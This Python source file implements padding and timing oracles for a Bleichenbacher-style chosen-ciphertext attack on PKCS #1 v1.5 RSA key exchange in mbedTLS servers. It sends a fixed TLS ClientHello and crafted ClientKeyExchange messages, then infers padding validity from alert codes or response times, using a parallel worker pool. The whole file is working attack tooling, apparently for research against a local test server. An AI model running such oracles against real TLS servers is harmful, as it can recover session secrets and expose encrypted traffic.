"""
Oracles for chosen-ciphertext attacks on PKCS #1
"""
from Crypto.Cipher import PKCS1_v1_5
import ssl_client
import socket
import struct
import select
import time
import timeit
import multiprocessing
import itertools


def _build_keyexch(pms, identity=b"Client_identity"):
    paramslen = 4 + len(pms) + len(identity)
    fmt = ">BHHBBHH%usH%us" % (len(identity), len(pms))
    return struct.pack(fmt, 22, 0x303, paramslen + 4, 16, 0, paramslen, len(identity), identity, len(pms), pms)

def _sock_init(addr, port):
    sock = socket.socket()
    sock.connect((addr, port))
    sock.send(bytes.fromhex("16030300610100005d030362ac2c12d90b74d84a688188a36a11df1455920891da9ab4cfc2cfb8f0ba0a7d00000400b600ff010000300000000e000c0000096c6f63616c686f7374000d000e000c060306010503050104030401001600000017000000230000"))
    sock.setblocking(0)
    _read_server_hello(sock)
    return sock

def _read_bytes(sock, count, timeout=1):
    res = select.select([sock], [], [], timeout)
    if not res[0]:
        return b""
    return sock.recv(count)

def _read_server_hello(sock):
    while True:
        hdr = _read_bytes(sock, 6)
        typ, ver, length, msgtype = struct.unpack(">BHHB", hdr)
        _read_bytes(sock, length - 1)  # read rest of frame
        if msgtype == 0xE:  # server hello done
            break

def _read_resp(sock):
    typ = _read_bytes(sock, 1)
    if len(typ) == 0:
        return -1
    if typ != b"\x15":
        return -2
    ver = _read_bytes(sock, 2)
    length = _read_bytes(sock, 2)
    if length != b"\x00\x02":
        return -3
    lvl = _read_bytes(sock, 1)
    if lvl != b"\x02":
        return -4
    desc = _read_bytes(sock, 1)
    return int.from_bytes(desc, byteorder="big")

def _init_sock(method):
    def new_method(self, *args, **kwargs):
        if self.sock is None:
            self.sock = _sock_init(self.addr, self.port)
        return method(self, *args, **kwargs)
    return new_method


class _MbedTLS_Oracle_Single:
    ERROR_INVALID_PADDING=91

    def __init__(self, addr, port, stage):
        self.sock = None
        self.addr = addr
        self.port = port
        self.stage = stage
        self.stage_queries = {1: self.query_by_error, 2: self.query_by_error,
                              3: self.query_by_timing, 4: self.query_by_timing,
                              5: self.query_by_average, 6: self.query_by_average,
                              7: self.query_by_error, 8: self.query_by_error}

    def query_by_error(self, content):
        self.sock.send(_build_keyexch(content))
        resp = _read_resp(self.sock)
        return resp != self.ERROR_INVALID_PADDING

    def query_by_timing(self, content, iterations=3, threshold=0.05):
        for _ in range(iterations):
            start = time.time()
            self.query_by_error(content)
            end = time.time()
            if end - start < threshold:
                return False
        return True

    def query_by_average(self, content, iterations=3, threshold=0.025):
        total = timeit.timeit(lambda : self.query_by_error(content), number=iterations)
        time_avg = total / iterations
        return time_avg > threshold

    @_init_sock
    def query(self, content, *args, **kwargs):
        return self.stage_queries[self.stage](content, *args, **kwargs)

def _worker_main(arg):
    addr, port, stage, query_queue, result_queue = arg
    oracle = _MbedTLS_Oracle_Single(addr, port, stage)
    while True:
        query_id, content, args, kwargs = query_queue.get(True)
        result_queue.put((query_id, oracle.query(content, *args, **kwargs)), block=True)


class MbedTLS_Oracle:
    def __init__(self, addr="127.0.0.1", port=4433, stage=1, num_servers=1):
        self.num_servers = num_servers
        self.pool = multiprocessing.Pool(processes=num_servers)
        self.manager = multiprocessing.Manager()
        self.query_queue = self.manager.Queue()
        self.result_queue = self.manager.Queue()
        worker_arg = (addr, port, stage, self.query_queue, self.result_queue)
        self.pool.map_async(_worker_main, itertools.repeat(worker_arg, num_servers))

    def add_query(self, query_id, content, *args, **kwargs):
        self.query_queue.put((query_id, content, args, kwargs), False)

    def wait_query(self):
        query_id, result = self.result_queue.get(True)
        return query_id, result

    def __len__(self):
        return self.num_servers
